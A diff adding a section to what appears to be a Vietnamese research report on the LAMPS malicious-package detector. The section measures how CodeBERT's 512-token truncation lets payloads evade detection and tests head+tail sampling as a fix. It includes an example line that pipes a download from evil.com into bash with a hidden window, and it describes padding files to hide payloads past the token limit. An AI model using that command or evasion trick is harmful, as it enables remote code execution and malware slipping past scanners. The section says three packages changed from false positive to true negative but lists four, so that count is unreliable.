@@ -131,7 +131,7 @@ Phương pháp này cho phép đọc toàn bộ CSV vào bộ nhớ (in-memory) 
                   Predicted
                   BENIGN    MALICIOUS
 Actual  BENIGN  [  2,980  |    20   ]  ← 20 FP (0.67%)
-        MAL.   [   163   |  2,489  ]  ← 163 FN (6.15%)
+        MAL.    [   163   |  2,489  ]  ← 163 FN (6.15%)
 ```
 
 **Phân tích:**
@@ -573,3 +573,149 @@ Báo cáo này đã thực hiện thành công quá trình tái hiện hệ th�
 ---
 
 *Báo cáo được tạo ngày 04/05/2026. Tất cả script và dữ liệu lưu tại thư mục `scripts/` và `outputs/` trong project LAMPS.*
+
+---
+
+## 8. Cải Thiện G4 — Head+Tail Sampling cho Truncation Evasion
+
+### 8.1 Vấn đề: Truncation tại 512 tokens
+
+**Gap G4** trong phân tích research gap xác định một lỗ hổng bảo mật nghiêm trọng trong LAMPS: toàn bộ pipeline hard-code `MAX_LENGTH = 512` với `truncation=True` của HuggingFace — mặc định giữ lại **512 token đầu tiên** và **bỏ qua toàn bộ phần còn lại**.
+
+```python
+# evaluation/run_d2_protocol.py — trước cải thiện
+MAX_LENGTH = 512
+encoded = tokenizer(texts, max_length=MAX_LENGTH, truncation=True, ...)
+# → Token 513 trở đi: hoàn toàn vô hình với CodeBERT
+```
+
+**Kỹ thuật evasion thực tế:**
+```python
+# File 1500 tokens: 512 tokens đầu là code hợp lệ (math, docstrings...)
+# Token 513+: payload thực sự — CodeBERT không bao giờ thấy
+import subprocess
+subprocess.Popen("curl http://evil.com | bash", shell=True, creationflags=0x08000000)
+```
+
+### 8.2 Bằng chứng: Quy mô của vấn đề trên D2
+
+Trước khi chạy inference, chúng tôi tokenize tất cả 1,328 file và đếm số file vượt quá 512 tokens:
+
+| Thống kê | Giá trị |
+|----------|---------|
+| Tổng file trong D2 | 1,328 |
+| File vượt quá 512 tokens | **732** |
+| Tỷ lệ bị ảnh hưởng | **55.12%** |
+| Token dài nhất được ghi nhận | 2,024 tokens |
+
+> **55.12% file trong D2 bị truncate** — tức là hơn nửa dataset, CodeBERT chỉ thấy một phần nội dung. Đây là attack surface rất lớn cho kẻ tấn công khai thác.
+
+### 8.3 Giải pháp: Head+Tail Sampling
+
+**Ý tưởng:** Thay vì chỉ lấy 512 token đầu, lấy **256 token đầu + 256 token cuối** — bao phủ cả vùng imports/class setup (đầu file) lẫn vùng execution/payload (cuối file).
+
+```python
+# evaluation/run_d2_protocol.py — sau cải thiện
+def _head_tail_text(text, tokenizer, head=256, tail=256):
+    ids = tokenizer.encode(text, add_special_tokens=False, truncation=False)
+    if len(ids) <= head + tail:
+        return text  # file ngắn: không thay đổi
+    head_text = tokenizer.decode(ids[:head], skip_special_tokens=True)
+    tail_text = tokenizer.decode(ids[-tail:], skip_special_tokens=True)
+    return head_text + "\n" + tail_text
+```
+
+**Cách dùng:**
+```bash
+# Baseline (paper gốc)
+python -m evaluation.run_d2_protocol --model_id KevinPhamH/codebert-finetuned \
+    --strategy head --threshold 0.90
+
+# G4 fix
+python -m evaluation.run_d2_protocol --model_id KevinPhamH/codebert-finetuned \
+    --strategy head_tail --threshold 0.90
+```
+
+### 8.4 Kết quả So sánh
+
+**Package-level (đơn vị đánh giá chính):**
+
+| Metric | Baseline `head` | G4 Fix `head_tail` | Delta |
+|--------|:--------------:|:------------------:|:-----:|
+| Accuracy | **98.09%** | 97.93% | −0.16pp |
+| Balanced Accuracy | **98.48%** | 98.01% | −0.47pp |
+| Precision | 95.10% | **96.22%** | **+1.12pp** |
+| Recall | **100.00%** | 98.28% | −1.72pp |
+| F1 | **97.49%** | 97.24% | −0.25pp |
+| TP | 233 | 229 | −4 |
+| TN | 384 | **387** | **+3** |
+| FP | 12 | **9** | **−3** |
+| FN | 0 | 4 | +4 |
+
+**File-level:**
+
+| Metric | Baseline `head` | G4 Fix `head_tail` | Delta |
+|--------|:--------------:|:------------------:|:-----:|
+| Accuracy | 98.87% | 98.87% | 0 |
+| Precision | 95.33% | **96.78%** | **+1.45pp** |
+| Recall | **100.00%** | 98.37% | −1.63pp |
+| FP | 15 | **10** | **−5** |
+| FN | 0 | 5 | +5 |
+
+### 8.5 Phân tích Kết quả
+
+#### Điểm tích cực — Head+Tail giảm False Positive
+
+**3 package chuyển từ FP → TN** (không còn báo nhầm):
+- `googleapis_common_protos-1.74.0`
+- `opentelemetry_proto-1.41.1`
+- `paramiko-4.0.0`
+- `yandexcloud-0.387.0`
+
+Những package này là **benign hợp lệ** nhưng chứa code trông có vẻ đáng ngờ khi chỉ nhìn 512 token đầu (ví dụ: paramiko có code SSH/encryption, opentelemetry có serialization code). Khi head+tail bổ sung thêm 256 token cuối, CodeBERT có đủ context để phân loại đúng là benign. **Precision cải thiện từ 95.10% → 96.22%**.
+
+#### Điểm đánh đổi — Head+Tail tạo ra False Negative
+
+**4 package chuyển từ TP → FN** (bị bỏ sót):
+- `aio3`, `composer-dev`, `dell-restore-system`, `dfdfdfdfhhh`
+
+Cả 4 đều là **single-file malicious package**. Dưới chiến lược `head` (512 token đầu), CodeBERT nhìn thấy vùng tokens 0–511 và phát hiện được signal độc hại. Dưới `head_tail`, vùng tokens 256–511 bị bỏ qua (lấy 0–255 và phần đuôi). **Payload của 4 package này nằm trong vùng tokens 256–511** — đây chính là "middle zone" mà cả hai chiến lược đều có blind spot riêng.
+
+#### Diễn giải toàn diện
+
+```
+Strategy  | Blind spot           | Attack scenario bị bỏ sót
+----------|----------------------|---------------------------
+head      | Tokens 512+          | Payload ở cuối file dài
+head_tail | Tokens 256-511       | Payload ở giữa file dài
+```
+
+Head+tail **đóng cửa sổ evasion tại tail** (không còn payload ở token 513+ bị bỏ qua) nhưng **tạo ra một blind spot mới** tại vùng giữa file. Đây là bằng chứng thực nghiệm rõ ràng rằng **truncation bất kỳ ở đâu đều tạo ra cơ hội evasion** — giải pháp triệt để cần tiếp cận sliding window (xem mục 8.6).
+
+**Overhead thời gian:** Head+tail chạy ~14 s/batch vs ~12 s/batch cho head (tăng ~17%) — do bước encode-decode-re-encode thêm trong `_head_tail_text()`.
+
+### 8.6 Giải pháp Triệt Để hơn (Hướng Phát Triển)
+
+Head+tail là cải tiến đơn giản và nhanh chóng. Để không có blind spot nào, cần **sliding window**:
+
+```python
+# Chia file thành các chunk 512 token overlap, classify từng chunk, lấy max prob
+# → Không bỏ sót bất kỳ vùng nào trong file
+probs_per_chunk = [predict(chunk) for chunk in sliding_window(file, size=512, step=256)]
+final_prob = max(probs_per_chunk)
+```
+
+Hoặc dùng **Longformer/BigBird** (context lên đến 4,096 tokens) — nhưng cần model mới và compute cao hơn.
+
+### 8.7 Tóm tắt G4
+
+| Khía cạnh | Kết quả |
+|-----------|---------|
+| Quy mô vấn đề | **55.12% file D2** bị truncate (732/1,328) |
+| Cải thiện Precision | +1.12pp (95.10% → 96.22%) — ít false alarm hơn |
+| Đánh đổi Recall | −1.72pp (100% → 98.28%) — 4 package bị bỏ sót |
+| FP giảm | 12 → 9 (−3 false positives) |
+| FN tăng | 0 → 4 (middle-zone blind spot) |
+| Kết luận | Head+tail đóng tail evasion window; giải pháp triệt để hơn là sliding window |
+
+> **Takeaway:** Truncation tại bất kỳ vị trí cố định nào đều tạo ra evasion opportunity. LAMPS cần chiến lược coverage toàn bộ file (sliding window) để loại bỏ hoàn toàn G4. Head+tail là bước cải tiến thực tế trong điều kiện resource hạn chế.
